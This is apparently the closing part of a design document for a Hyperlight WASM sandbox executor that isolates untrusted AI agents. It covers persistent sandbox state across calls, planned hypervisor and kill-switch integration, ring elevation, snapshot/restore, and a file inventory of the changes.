BLOCKED: Execution denied for Ring 3 agent 'did:mesh:untrusted-agent':
Hyperlight WASM sandbox is required but not installed.
Install with: pip install agent-os-kernel[hyperlight]
```

### 13.6 Persistent VM State Across Calls

```python
# First call — define a variable
result1 = executor.execute(
    agent_id=agent_id,
    code='research_data = {"papers": 42}\nprint(f"Stored: {research_data}")',
)
print(f"Call 1: {result1.stdout}")

# Second call — variable persists in the same micro-VM
result2 = executor.execute(
    agent_id=agent_id,
    code='research_data["papers"] += 10\nprint(f"Updated: {research_data}")',
)
print(f"Call 2: {result2.stdout}")

# Teardown
executor.unregister_agent(agent_id)
print(f"Agent {agent_id} unregistered. Sandbox destroyed.")
```

**Output:**
```
Call 1: Stored: {'papers': 42}
Call 2: Updated: {'papers': 52}
Agent did:mesh:research-agent-001 unregistered. Sandbox destroyed.
```

---

## 14. Future Work

### 14.1 Hypervisor ↔ Executor Bridge (Not Yet Implemented)

The hypervisor ring model and the sandbox executor are currently separate.
The planned integration:

```python
# When RingEnforcer assigns Ring 3:
ring = await hv.join_session(session_id, agent_did, sigma_raw=0.3)
if ring == ExecutionRing.RING_3_SANDBOX:
    executor.register_agent(agent_did, config=sandbox_config_from_ring3())
```

This bridge would:
1. Auto-register Ring 3 agents in the sandbox executor on session join.
2. Wrap each `executor.execute()` with `RingBreachDetector.record_call()`.
3. Trip the `KillSwitch` if the breach detector fires HIGH/CRITICAL.


### 14.3 Ring Elevation from Sandbox

When the `RingElevationManager` is implemented (post Public Preview),
an agent that builds trust over sustained sandbox execution could be
promoted from Ring 3 → Ring 2, moving from WASM isolation to in-process
execution.

### 14.4 Snapshot / Restore

Hyperlight supports `sandbox.snapshot()` and `sandbox.restore(snap)`.
This could enable:

- Checkpointing agent state before risky operations.
- Rolling back to a known-good state if execution fails.
- Cloning an agent's state for parallel exploration.

---

## 15. Appendix: File Inventory

| File | Package | Status |
|------|---------|--------|
| `packages/agent-os/src/agent_os/policies/schema.py` | agent-os-kernel | Modified — added `SandboxPolicy`, `ToolAllowEntry`, `ToolAllowlist`, `DomainAllowEntry`, `NetworkAllowlist`, `PolicyDocument.sandbox`, `PolicyDocument.tool_allowlist`, `PolicyDocument.network_allowlist` |
| `packages/agent-os/src/agent_os/policies/__init__.py` | agent-os-kernel | Modified — exports `SandboxPolicy`, `ToolAllowEntry`, `ToolAllowlist`, `DomainAllowEntry`, `NetworkAllowlist` |
| `packages/agent-os/src/agent_os/sandbox_provider.py` | agent-os-kernel | Modified — added `HyperlightSandboxProvider` with persistent sandboxes, `is_hyperlight_available()` |
| `packages/agent-os/pyproject.toml` | agent-os-kernel | Modified — added `hyperlight` optional dependency |
| `packages/agent-os/templates/policies/production.yaml` | agent-os-kernel | Modified — added `sandbox:` section |
| `packages/agent-runtime/src/agent_runtime/sandbox_executor.py` | agentmesh-runtime | Created — `GovernedSandboxExecutor`, `AgentRegistration`, `ExecutionResult`, `sandbox_config_from_policy()` |
| `packages/agent-runtime/src/agent_runtime/__init__.py` | agentmesh-runtime | Modified — exports new types |
| `packages/agent-runtime/pyproject.toml` | agentmesh-runtime | Modified — added `sandbox` optional dependency |
| `packages/agent-runtime/tests/test_sandbox_executor.py` | agentmesh-runtime | Created — 30 tests |
| `packages/agent-runtime/tests/test_wasm_sandbox_ring3_design.py` | agentmesh-runtime | Created — 32 tests validating design-doc claims against code |
| `packages/agent-runtime/tests/test_runtime_imports.py` | agentmesh-runtime | Modified — updated `ALL_EXPORTS` |
